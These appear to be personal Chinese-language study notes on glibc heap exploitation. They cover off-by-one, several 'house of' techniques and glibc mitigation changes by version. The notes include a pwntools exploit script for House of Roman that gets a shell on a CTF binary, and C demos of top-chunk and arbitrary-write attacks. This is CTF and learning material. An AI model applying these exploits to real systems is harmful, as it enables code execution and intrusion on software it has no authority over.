堆重叠，重分配是指分配出的chunk覆盖了其他正在使用chunk的范围。
溢出一个字节也可以导致攻击。溢出null字符又被称作off by null。
这个攻击方法在glibc>2.29后需要伪造prev_size，相对比较困难。
出现原因：
1. 错误的for循环边界，导致越界写1个字节。
> 建造一条直栅栏（即不围圈），长 30 米、每条栅栏柱间相隔 3 米，需要多少条栅栏柱？
> 
> 最容易想到的答案 10 是错的。这个栅栏有 10 个间隔，11 条栅栏柱。
2. C语言中字符串结尾是0x00，由于1导致额外多写1个字节的null。strcpy 等字符串操作函数会出现这个问题。
需要注意的是，由于prev_size的存在，chunk会加8向上对其16bytes，因此
off by one 是与size相关的攻击。
1. 减小释放后chunk的size

![[shrink chunk.png]]




## house_of_orange

特点：
-   首次出现在hitcon_2016. 不通过free获得一个被释放的chunk
-   存在堆溢出或者其他可改写`top_chunk`大小的漏洞

```
#include<stdlib.h>
int main(int argc, char const *argv[])
{
        char *a = malloc(0x38);
        //修改top chunk 大小
        *(size_t *)(a - 0x10 + 0x40 + 0x8) = 0xd31;
        a = malloc( 0xe38);
        return 0;
}
```

通过堆溢出修改`top_chunk`的大小,如果`malloc`申请的堆块大小超过了`top_chunk`的大小,将调用`sysmalloc`来进行分配.

`sysmalloc`针对这种情况有两种处理,如果申请大小大于等于`mp_.mmap_threshold`就直接调用`mmap`,否则就扩展`top_chunk`

```
old_top = av->top;
old_size = chunksize (old_top);
old_end = (char *) (chunk_at_offset (old_top, old_size));
brk = snd_brk = (char *) (MORECORE_FAILURE);//无用
assert ((old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & pagemask) == 0));
assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));
```

1.  `top_chunk_size > MINSIZE`.`#define MINSIZE (unsigned long)(((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK))`.
2.  `top_chunk`需要有`pre_in_use`的标志(`top_chunk & 1 = 1`).
3.  `top_chunk`的尾部要求页对齐(由于原`top_chunk_size`满足该条件,所以`fake = real % 0x1000 + n * 0x1000`).
4.  `top_chunk_size`小于申请分配的内存.

满足条件后就会继续往下执行,最后把`old_top`释放.这样就可以得到一个`unsort_bin`.再次`malloc`即可泄露`libc`,还可以通过`large bin`泄露`heap`.

第二步就是劫持控制流.

劫持控制流使用的是`File Stream Oriented Programming`,用于触发的函数是用于输出错误信息的`malloc_printerr`,`malloc_printerr`其实是调用`__libc_message`函数之后调用`abort`函数,`abort`函数其中调用了`_IO_flush_all_lockp`。

通过`unsortbin attack`修改`_IO_list_all`为`unsorted_chunks (av)`,这样`_IO_list_all`会将`unsorted_chunks (av)`处当作一个`_IO_FILE`结构体,调用`_IO_flush_all_lockp`时由于第一个`_IO_FILE`结构体可能不符合检测(`_mode`字段`1/2`几率通过),就会通过`chain`字段跳转到下一个`IO_FILE_plus`.

```c
/ ./libio/genops.c
int _IO_flush_all_lockp (int do_lock) {
    /* code */
    while (fp != NULL) {
        run_fp = fp;
        if (do_lock)
                _IO_flockfile (fp);

        if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
            || (_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base))
#endif
            ) && _IO_OVERFLOW (fp, EOF) == EOF)
        //#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH),所以满足前两个就会发生调用.
                result = EOF;

        if (do_lock)
                _IO_funlockfile (fp);
        run_fp = NULL;

        if (last_stamp != _IO_list_all_stamp) {
                fp = (_IO_FILE *) _IO_list_all;
                last_stamp = _IO_list_all_stamp;
            } else
                fp = fp->_chain;
    }
#ifdef _IO_MTSAFE_IO
    if (do_lock)
        _IO_lock_unlock (list_all_lock);
    __libc_cleanup_region_end (0);
#endif
    return result;
}
```

`_IO_FILE`结构体的`chian`字段(偏移为`0x68`)是`bins`的`index`为`6`的地方,也就是满足大小为`0x70`的`chunk`.

只需要再次利用漏洞将`unsorted bin`大小改为`0x70`,同时满足以下检测即可劫持虚表.

```
((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) || (_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)))
```

## house_of_lore
特点:
- **改写`small bin chunk`的`bk`指针**。
- 同时在可控内存区域构造一个`fake small bin`链表,从而劫持`small bin`分配一个`fake chunk`出来.
- 空闲`small bin chunk`取出时要过`fd`,`bk`的`pass`
- 所以链表要够长.至少要2个chunk才行

## house_of_roman
- 开启PIE没有leak地址利用

uaf 配合部分写getshell
1. 首先分配`3`个`chunk`,大小分别为`0x20`,`0xd0`,`0x70`.
2. 在`chunk2 + 0x78`处设置`p64(0x61)`,作用是`fake size`,用于后面的`fastbin attack`.
3. 然后再分配`3`个大小`0x70`的`chunk`,释放`chunk3`,`chunk4`,此时`chunk4->fd = chunk3`.修改`chunk4->fd`的低字节,使得`chunk4->fd = chunk2`.
4. 修改`chunk2->size = 0x71`.此时`chunk2->fd`为`main_arean`地址,通过修改低`2`个字节,可以修改到`malloc_hook - 0x23`处(注意,这里需要爆破`1/16`),然后分配`3`次`0x70`的`chunk`拿到包含`malloc_hook`的`chunk`.
5. 此时`malloc_hook`内容为`0`,然后利用`unsorted bin`修改`malloc_hook`内容为`main_arean`的地址,利用部分写修改`malloc_hook`为`one_gadget`(注意,这里需要爆破`1/4096`).
6. 触发`malloc_printerr`
#todo 
https://github.com/romanking98/House-Of-Roman
```python
from pwn import *

def create(size, index):
	r.sendlineafter("3. Free", "1")
  r.sendlineafter(":", str(size))
  r.sendlineafter(":", str(index))

def free(index):
  r.sendlineafter("3. Free", "3")
  r.sendlineafter(":", str(index))

def edit(index, content):
	r.sendlineafter("3. Free", "2")
	r.sendlineafter(":", str(index))
	sleep(0.1)
	r.send(content)

r = process("./new_chall", env={"LD_PRELOAD": "./libc-2.24.so"})
r.sendlineafter(":", "a" * 20)

create(0x18, 0)
create(0xc8, 1)
edit(1, "A" * 0x68 + p64(0x61))
create(0x68, 2)
free(1)
create(0xc8, 1)

edit(0, "a" * 24 + "\x71")

create(0x68, 3)
create(0x68, 15)
create(0x68, 16)
create(0x68, 17)
create(0x68, 18)
create(0x68, 19)

free(2)
free(3)
edit(3, "\x20")
edit(1, "\xcd\x4a")

create(0x68,0)
create(0x68,0)
create(0x68,0)

# free(15)
# edit(15, p64(0x00))

create(0xc8, 1)
create(0xc8, 1)
create(0x18, 2)
create(0xc8, 3)
create(0xc8, 4)

free(1)
edit(1, "a" * 8 + "\xe0\x4a")
create(0xc8, 1)

edit(0, "a" * 0x13 + "\x4f\x39\x5b")

create(0xc8, 7)
try:
	resp = r.recv(4, timeout=6)
	r.interactive()
except:
	r.close()
```
## house_of_einherjar
1. off by one的一种，修改top chunk的 prev_size和prev_inuse导致向前合并任意写。
2. 修改下一个正在使用中chunk的prev_inuse，同时修改prev_size 为目标堆块，释放后指令unlink(target chunk)然后加入bin中。
    - 对重叠
    - 任意地址写(需要提前绕过unlink双向检查)


## house_of_rabbit
- 可以修改fastbin的fd指针或size.
- 可以触发malloc_consolidate.
- 可以分配任意大小的堆块并且释放.
- 
第一种攻击方式:修改size造成overlap chunk,然后触发malloc_consolidate使fastbin清空,从而分配出重叠的堆块.
第二种攻击方式:修改fd指向一个fake chunk,然后触发malloc consolidate使fake chunk成为一个合法的chunk.
攻击流程.
- 当size超过某特定阈值时,malloc会使用mmap来分配堆块,但同时会改变该阈值.通过连续malloc并free两次超大chunk,会扩大top chunk size.
- 再申请一个fast chunk和一个small chunk,保证small chunk紧邻top chunk.
- 在可控内存处伪造两个chunk.一个size为0x11,绕过检查.一个size为0xfffffffffffffff1,覆盖任意地址.
- 再利用其他漏洞将0xfffffffffffffff1大小的fake chunk链接到fastbin链表,free触发malloc_consolidate,用于对fastbin合并并放到unsorted bin中.
- 再申请一个超大chunk将0xfffffffffffffff1大小的fake chunk链接到largebin,最后申请任意长度的地址,使堆块地址上溢到当前堆地址的低地址位置,从而可以分配到任意地址,达到内存任意写的目的.
house_of_rabbit可以绕过堆块的地址随机化保护达到任意地址分配的效果,下面是攻击demo.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char target[0x30] = "Hello, World!";
unsigned long gbuf[8] = {0};

int main(void){
    void *p, *fast, *small, *fake;
    char *victim;

    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    p = malloc(0xa00000);
    free(p);
    p = malloc(0xa00000);
    free(p); // 使av->system_mem > 0xa00000

    fast = malloc(0x18);
    small = malloc(0x88);
    free(fast);

    gbuf[0] = 0xfffffffffffffff0;
    gbuf[1] = 0x10;
    gbuf[3] = 0x21;
    gbuf[7] = 0x1;

    fake = &gbuf[2];
    *(unsigned long**)fast = fake;

    free(small); // malloc_consolidate

    gbuf[3] = 0xa00001;
    malloc(0xa00000); // fake chunk to large bin
    
    gbuf[3] = 0xfffffffffffffff1; // edit fake chunk size
    malloc((void*)&target - (void*)(gbuf + 2) - 0x20);
    victim = malloc(0x10);
    strcpy(victim, "Hacked!!");

    printf("%s\n", target);
}
```

## house_of_force

- 改写`top_chunk`为一个很大的值。

通过malloc出任意地址达到任意写。想要改写的变量位置在`target`,`top chunk`的位置在`top`,再算上`head`的大小,只需要`malloc`出`target - top - 0x10`个字节(可以为负数,溢出运算).

## house_of_corrosion

- 需要一个堆溢出漏洞.
- 可以分配较大的堆块(size <= 0x3b00).
- 不需要任何泄露.
unsortedbin attack修改global_max_fast之后,通过分配释放特定大小(size = (offset * 2) + 0x20,offset为目标地址与fastbinY(main_arena + 16)的距离)的堆块,可以修改地址位于fastbinY之后的数据.
攻击步骤:堆风水,unsortedbin attack,fake unsorted chunk,改写stderr,触发stderr控制执行流.


## house_of_kiwi
## house_of_husk
## house_of_botcake
## house_of_storm
## hourse_of_mind
## house_of_Prime
## house_of_underground
## house_of_pig
https://bbs.pediy.com/thread-268245-1.htm#msg_header_h2_2
https://www.anquanke.com/post/id/242640
https://www.anquanke.com/post/id/216290#h2-4
## house_of_banana
https://www.anquanke.com/post/id/222948?display=mobile

## house_of _corrosion
https://www.anquanke.com/post/id/263622#h3-11

## house_of_chaos
//todo 
https://seclists.org/bugtraq/2005/Oct/118
## mmap Chunks overflow
前提：需要任何大小的的malloc，但不需要free。 
当malloc size超过0x21000时，会改用mmap直接申请新的空间
mmap得到的地址是连续的，同通常是在上一次mmap之前，通常在tls段，malloc时会分局tls段上某个指针来决定使用的arena,
mmap chunk overflow可以覆盖arena的指针，
tls段上还有stack address stack guard canary 
伪造arena的fastbin部分，使下次malloc时可以取得的chunk。
## tips
1. 如果要改写got，那么建议malloc(0x38),因为got表有很多0x40字节。
![[malloc_got.png]]
2. 不带符号libc偏移寻找和计算：使用ida逆向。
# glibc版本变化
## 2.23
第11个版本在unlink增加了next_chunk的prev_size 校验，off by one比较难做了。
[[#unlink]]
## 2.24
不能在伪造vtable了，检查了vtable地址范围，但是可以错位构造，利用函数指针rce。
## 2.27
新增了tcache，检查非常少。可以直接劫持fd。并且不会检查next chunk的size
## 2.28
unsorted bin attack失效
IO_FILE中的str_finfish str_overflow失效，直接使用malloc和free代替。
## 2.29
1. tcache增加了一个key判断当前heap是否在tcache中。容易绕过，这个在2.27就引入了
2. 增加了向后合并前检查后面的chunk 的size和当前chunk的prev_size是否相等，注意**unlink中**检查的是下一个chunk 的prev_size和当前chunk的size是否相等，也就是说后向合并时，p前后chunk size 都检查了。[[#off by one]]无法使用了，但可以伪造绕过
```c
/* consolidate backward */
if (!prev_inuse(p)) {
    prevsize = prev_size (p);
    size += prevsize;
    p = chunk_at_offset(p, -((long) prevsize));
    if (__glibc_unlikely (chunksize(p) != prevsize)) // new
        malloc_printerr ("corrupted size vs. prev_size while consolidating"); // new
    unlink_chunk (av, p);
}
```
3. Unsorted bin attack(house of strom)无法使用了,指针，size通通检查
```c
mchunkptr next = chunk_at_offset (victim, size);
if (__glibc_unlikely (size <= 2 * SIZE_SZ) || __glibc_unlikely (size > av->system_mem))
    malloc_printerr ("malloc(): invalid size (unsorted)");
if (__glibc_unlikely (chunksize_nomask (next) < 2 * SIZE_SZ) || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))
    malloc_printerr ("malloc(): invalid next size (unsorted)");
if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))
    malloc_printerr ("malloc(): mismatching next->prev_size (unsorted)");
if (__glibc_unlikely (bck->fd != victim) || __glibc_unlikely (victim->fd != unsorted_chunks (av)))
    malloc_printerr ("malloc(): unsorted double linked list corrupted");
if (__glibc_unlikely (prev_inuse (next)))
    malloc_printerr ("malloc(): invalid next->prev_inuse (unsorted)");
/* remove from unsorted list */
if (__glibc_unlikely (bck->fd != victim))
    malloc_printerr ("malloc(): corrupted unsorted chunks 3");
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);
```
4. top chunk size 检查，需要小于system_mems. House of orange,
House of Force等手段不太行了。
```c
 
if(__glibc_unlikely (chunksize(p) != prevsize))    *//new*       
    malloc_printerr ("corrupted size vs. prev_size while consolidating");
```
5. 新的手段：
setcontext的参数改成了rdx:
link_map劫持,通过link_map获取fini_array中的函数,当执行fini_arry第二个函数时,rdx指向第一个fini_array的位置,这样rdx就可以控制,从而通过setcontext控制程序流.
## 2.30

对`large bin`的`bk`和`bk_nextsize`做出了限制,large bin attack无法使用了

```c
else {
    victim_index = largebin_index (size);
    bck = bin_at (av, victim_index);
    fwd = bck->fd;

    if (fwd != bck) {
        size |= PREV_INUSE;
        assert (chunk_main_arena (bck->bk));
        if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk)) {
            fwd = bck;
            bck = bck->bk;

            victim->fd_nextsize = fwd->fd;
            victim->bk_nextsize = fwd->fd->bk_nextsize;
            fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
        } else {
            assert (chunk_main_arena (fwd));
            while ((unsigned long) size < chunksize_nomask (fwd)) {
                fwd = fwd->fd_nextsize;
                assert (chunk_main_arena (fwd));
            }
            if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))
                /* Always insert in the second position.  */
                fwd = fwd->fd;
            else {
                victim->fd_nextsize = fwd;
                victim->bk_nextsize = fwd->bk_nextsize;
                if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd)) // new
                    malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
                fwd->bk_nextsize = victim;
                victim->bk_nextsize->fd_nextsize = victim;
            }
            bck = fwd->bk;
            if (bck->fd != fwd) // new
                malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
        }
    } else
        victim->fd_nextsize = victim->bk_nextsize = victim;
}
```
## 2.31
1. 将unsorted bin chunk放入large bin时新加一个双链表完整性检查，如果chunk size 大于largbin中尾部的size就会触发。
```c
//unsortedbin chunk->size < largebin chunk->size
if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk))
{
    fwd = bck;
    bck = bck->bk;
    victim->fd_nextsize = fwd->fd;
    victim->bk_nextsize = fwd->fd->bk_nextsize;
    fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
}
else //unsortedbin chunk->size >= largebin chunk->size
{
    assert (chunk_main_arena (fwd));
    while ((unsigned long) size < chunksize_nomask (fwd))
    {
        fwd = fwd->fd_nextsize;
        assert (chunk_main_arena (fwd));
    }
 
    if ((unsigned long) size== (unsigned long) chunksize_nomask (fwd))
    /* Always insert in the second position.  */
        fwd = fwd->fd;
    else
    {
        victim->fd_nextsize = fwd;
        victim->bk_nextsize = fwd->bk_nextsize;
        if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd))
            malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
        fwd->bk_nextsize = victim;
        victim->bk_nextsize->fd_nextsize = victim;
    }
    bck = fwd->bk;
    if (bck->fd != fwd)
        malloc_printerr ("malloc(): largebin double linked list corrupted (bk)")
```
2. tcache count变成两个字节。
3. 删除了tcache的assert，不再检查index合法性
4. 申请tcache时判断了count，大于0时才会从tcache申请。
## 2.32

1. safe-linking 缓解措施，加密了指针，保护`tcache / fast bin`空闲列表的`next / fd`指针，

```c
#define PROTECT_PTR(pos, ptr, type)  \
       ((type)((((size_t)pos) >> PAGE_SHIFT) ^ ((size_t)ptr)))

#define REVEAL_PTR(pos, ptr, type)   \
       PROTECT_PTR(pos, ptr, type)
```
![[Pasted image 20220701180645.png]]
2. tcache_get验证tcache是否对齐0x10
```c
if (__glibc_unlikely (!aligned_OK (e)))
    malloc_printerr ("malloc(): unaligned tcache chunk detected");
```

#todo
**roarctf-2019-easyheap**
## 2.34
溢出了hook
```
__free_hook

__malloc_hook

__realloc_hook

__memalign_hook

__after_morecore_hook
```
#  不同系统glibc版本
对应关系
ubuntu 16 2.23
ubuntu 18 2.27
ubutntu 20 2.31
ubuntu 22 2.35